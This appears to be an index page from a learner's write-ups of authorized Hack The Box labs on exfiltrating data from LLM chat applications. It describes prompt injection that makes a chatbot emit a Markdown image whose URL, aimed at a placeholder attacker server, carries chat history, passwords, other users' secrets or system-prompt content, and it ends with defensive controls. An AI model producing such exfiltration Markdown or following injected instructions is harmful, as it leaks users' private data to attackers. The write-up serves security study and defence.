# Data Exfiltration

Data exfiltration in LLM applications refers to techniques that manipulate a model into disclosing sensitive information through its outputs or external requests. Unlike traditional data theft, LLM-based exfiltration can abuse the model's access to conversation history, system instructions, other users' messages or sensitive application context.

This section focuses on practical LLM output exfiltration techniques demonstrated through authorized Hack The Box Academy labs. The experiments use Markdown image syntax as an exfiltration channel, causing the LLM to generate requests to an attacker-controlled HTTP server.

## Labs

| lab | technique | target |
|---|---|---|
| [exfiltration 1](./exfiltration-1.md) | markdown exfiltration | chat history |
| [exfiltration 2](./exfiltration-2.md) | message extraction | password |
| [exfiltration 3](./exfiltration-3.md) | cross-user extraction | secret |
| [exfiltration 4](./exfiltration-4.md) | system prompt injection | password |

## Attack Concept

The core technique used throughout these labs is **out-of-band exfiltration** through Markdown image rendering.

Instead of asking the LLM to directly reveal sensitive information, the attacker instructs it to construct a Markdown image whose URL contains the target data:

```markdown
![x](http://ATTACKER_SERVER:8000/log?data=SENSITIVE_DATA)
````

When the generated Markdown is processed by the application, the image URL causes an HTTP request to the attacker's server. The sensitive information is therefore transferred through the request URL rather than being displayed directly in the chatbot response.

The basic attack flow is:

```text
LLM
 │
 │ generates malicious Markdown
 ▼
![x](http://attacker-server/...?)
 │
 │ HTTP request
 ▼
Attacker-controlled HTTP server
 │
 │ logs request
 ▼
Exfiltrated data
```

A simple HTTP server can be used to observe these requests:

```bash
python3 -m http.server 8000
```

A `404 File not found` response is not necessarily a failure in this scenario. The important part is that the HTTP request reached the attacker-controlled server and the sensitive value appears in the request URL.

## Key Techniques

### Markdown-Based Exfiltration

Markdown image syntax can be abused as an indirect communication channel. The attacker embeds a remote URL and instructs the LLM to place sensitive information into a query parameter.

```markdown
![x](http://127.0.0.1:8000/log?data=...)
```

This can turn an otherwise invisible piece of model output into an external HTTP request.

### Conversation History Exfiltration

LLMs may have access to previous messages in the current conversation. An attacker can manipulate the model into inserting previous messages into an externally requested URL.

This demonstrates why conversation history must be treated as sensitive model context rather than ordinary prompt content.

### Cross-User Data Exposure

In multi-user chat systems, conversation context may contain information belonging to multiple users. If an attacker can inject instructions into a shared context, the model may be manipulated into disclosing another user's private information.

The critical security boundary is therefore not only the individual user's message but also **how conversation context is shared and isolated between users**.

### Persistent System Prompt Exfiltration

A compromised system prompt can create a persistent exfiltration mechanism. Unlike a single user-level injection, a malicious system instruction can affect every subsequent interaction processed using that system prompt.

This significantly increases the impact because every user message can potentially become an exfiltration channel.

## Security Impact

These labs demonstrate several security risks in LLM applications:

* Exposure of previous conversation messages
* Leakage of passwords and secrets
* Cross-user information disclosure
* Abuse of Markdown rendering and external resource loading
* Persistent exfiltration through compromised system prompts
* Out-of-band data leakage that may not appear in the visible chatbot response

The fundamental issue is that **LLM output is not necessarily passive text**. When rendered by an application, Markdown, HTML or other output formats can trigger secondary actions such as network requests.

## Defensive Considerations

LLM applications should treat generated output as untrusted data.

Relevant defensive controls include:

* Sanitize and constrain Markdown/HTML rendering
* Disable external resource loading where possible
* Apply network egress controls to LLM-facing applications
* Prevent LLM-generated URLs from accessing attacker-controlled destinations
* Isolate conversation contexts between users
* Protect system prompts and configuration sources from unauthorized modification
* Apply strict access controls to sensitive conversation data
* Monitor unexpected outbound HTTP requests
* Avoid placing secrets in model-accessible context unless necessary
* Treat prompt injection as an application security problem rather than only a model behavior problem

## Lab Environment

These experiments were performed in an authorized Hack The Box Academy environment.

The HTTP listener used for observing out-of-band requests:

```bash
python3 -m http.server 8000
```

The server logs incoming requests, allowing the exfiltrated data contained in URL parameters to be inspected.

## References

* Hack The Box Academy — LLM Output Attacks
* OWASP Top 10 for Large Language Model Applications
* OWASP GenAI Security Project
* MITRE ATLAS
